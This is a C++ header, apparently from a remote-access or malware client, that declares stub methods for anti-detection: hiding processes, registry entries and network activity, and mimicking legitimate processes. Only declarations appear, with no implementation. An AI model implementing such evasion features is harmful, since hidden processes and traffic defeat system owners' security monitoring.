#pragma once
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <string>

namespace Formidable {
namespace Client {
namespace Security {

class AntiDetectionTechniques {
public:
    static void InitializeAntiDetection();
    static void ApplyTechniques();
    
    class ProcessManipulation {
    public:
        static void HideProcess();
        static void MimicLegitimateProcess();
        static void ApplyProcessCamouflage();
    };
    
    class RegistryManipulation {
    public:
        static void HideRegistryEntries();
        static void CreateLegitimateRegistryKeys();
        static void ApplyRegistryCamouflage();
    };
    
    class NetworkManipulation {
    public:
        static void HideNetworkActivity();
        static void MimicLegitimateNetwork();
        static void ApplyNetworkCamouflage();
    };
};

} // namespace Security
} // namespace Client
} // namespace Formidable
